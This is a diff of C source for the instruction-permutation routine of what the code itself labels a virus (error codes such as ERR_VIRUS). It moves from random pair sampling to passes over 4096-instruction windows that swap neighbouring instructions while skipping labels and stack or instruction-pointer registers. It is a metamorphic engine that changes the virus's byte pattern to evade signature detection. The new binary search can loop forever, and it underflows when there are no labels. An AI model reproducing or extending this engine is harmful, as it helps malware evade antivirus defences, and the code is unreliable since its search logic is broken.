@@ -9,6 +9,9 @@
 #include "compiler_utils.h"
 #include "log_print_operands.h"
 
+#define INSTRUCTION_PERMUT_WINDOW	4096
+#define PERMUT_PASSES			2
+
 static bool	want_to_permutate(uint64_t *seed)
 {
 	return random(seed) % 2;
@@ -28,6 +31,39 @@ static bool	can_permutate(const struct operand *a, const struct operand *b)
 	return true;
 }
 
+static bool	is_label(const struct label *labels, size_t nlabels,
+			struct operand *op)
+{
+	size_t	low = 0;
+	size_t	high = nlabels - 1;
+	size_t	i;
+
+	while (true)
+	{
+		i = (low + high) / 2;
+		if (op->addr == labels[i].location)
+			return true;
+		else if (low == high)
+			break;
+		else if (op->addr < labels[i].location)
+			high = i;
+		else // (op->addr > labels[i].location)
+			low = i;
+	}
+	return false;
+}
+
+static bool	uses_reserved_registers(struct operand *a, struct operand *b)
+{
+	if ((a->src | a->dst | b->src | b->dst) & (RIP | RSP))
+	{
+		return true;
+	}
+	return false;
+}
+
+/* -------------------------------------------------------------------------- */
+
 static void	permutate_neighbors(struct operand *a, struct operand *b)
 {
 	// small addresses first
@@ -38,10 +74,7 @@ static void	permutate_neighbors(struct operand *a, struct operand *b)
 	}
 	// check if actually neighbours!
 	if (a->addr + a->length != b->addr)
-	{
-		// sys_exit(errors(ERR_VIRUS, _ERR_IMPOSSIBLE));
-		return ;
-	}
+		return (void)errors(ERR_VIRUS, _ERR_V_NOT_NEIGHBORS);
 
 	// backup 1st
 	uint8_t	swap_code[INSTRUCTION_MAXLEN];
@@ -65,9 +98,13 @@ static void	permutate_neighbors(struct operand *a, struct operand *b)
 	*b = swap;
 }
 
-static void	maybe_permutate(struct operand *a, struct operand *b, uint64_t *seed)
+static void	maybe_permutate(struct operand *a, struct operand *b, uint64_t *seed,
+			const struct label *labels, size_t nlabels)
 {
-	if (want_to_permutate(seed) && can_permutate(a, b))
+	if (want_to_permutate(seed)
+	&& can_permutate(a, b)
+	&& !uses_reserved_registers(a, b)
+	&& !is_label(labels, nlabels, b))
 	{
 		permutate_neighbors(a, b);
 	}
@@ -75,79 +112,48 @@ static void	maybe_permutate(struct operand *a, struct operand *b, uint64_t *seed
 
 /* -------------------------------------------------------------------------- */
 
-static bool	are_labels(const struct label *labels, size_t nlabels,
-			struct operand a, struct operand b)
+size_t		total_insts_size(struct operand insts[INSTRUCTION_PERMUT_WINDOW], size_t ninsts)
 {
-	for (size_t i = 0; i < nlabels; i++)
-	{
-		struct label	label = labels[i];
-
-		if (label.location == a.addr || label.location == b.addr)
-		{
-			return true;
-		}
-	}
-	return false;
-}
-
-static bool	has_untouchable_registers(struct operand a, struct operand b)
-{
-	if ((a.src | a.dst | b.src | b.dst) & (RIP | RSP))
-	{
-		return true;
-	}
-	return false;
-}
-
-/* -------------------------------------------------------------------------- */
-
-size_t		count_instructions(void *code, size_t codelen)
-{
-	size_t	ninsts = 0;
-
-	while (codelen)
-	{
-		size_t	instruction_length = disasm_length(code, codelen);
-
-		if (instruction_length == 0)
-			return 0; // TODO
-
-		codelen -= instruction_length;
-		ninsts  += 1;
-	}
-	return ninsts;
+	size_t	size = 0;
+	for (size_t i = 0; i < ninsts; i++)
+		size += insts[i].length;
+	return size;
 }
 
 /*
-** This function never fails : worst case senario, it does nothing
+** permutate_instructions
 */
 bool		permutate_instructions(struct safe_ptr ref, uint64_t seed)
 {
-	size_t	ninsts = count_instructions(ref.ptr, ref.size);
-
 	struct block_allocation	block_memory;
-	struct operand		insts[ninsts];
-
 	if (!disasm_block(&block_memory, ref))
 		return errors(ERR_THROW, _ERR_T_PERMUTATE_INSTRUCTIONS);
 
 	struct label	*labels = block_memory.blocks[0].labels;
 	size_t		nlabels = block_memory.blocks[0].nlabels;
+	size_t		curr_off = 0;
 
-	ninsts = disasm_operands(insts, ninsts, ref.ptr, ref.size);
-
-	debug_print_operands(insts, ninsts);
-
-	for (size_t i = 0; i < 1000; i++)
+	while (true)
 	{
-		uint64_t	rand = random_inrange(&seed, 0, ninsts - 2);
+		struct operand	insts[INSTRUCTION_PERMUT_WINDOW];
+		void		*ptr = ref.ptr + curr_off;
+		size_t		size = ref.size - curr_off;
+		size_t		ninsts;
 
-		if (are_labels(labels, nlabels, insts[rand], insts[rand + 1])
-		|| has_untouchable_registers(insts[rand], insts[rand + 1]))
+		ninsts = disasm_operands(insts, INSTRUCTION_PERMUT_WINDOW, ptr, size);
+		debug_print_operands(insts, ninsts);
+
+		if (ninsts < 2) break;
+
+		for (size_t i = 0; i < ninsts * PERMUT_PASSES; i++)
 		{
-			continue;
+			for (size_t j = 0; j + 1 < ninsts; j++)
+			{
+				maybe_permutate(&insts[j], &insts[j + 1], &seed, labels, nlabels);
+			}
 		}
-		maybe_permutate(&insts[rand], &insts[rand + 1], &seed);
+		curr_off += total_insts_size(insts, ninsts);
 	}
+
 	return true;
 }
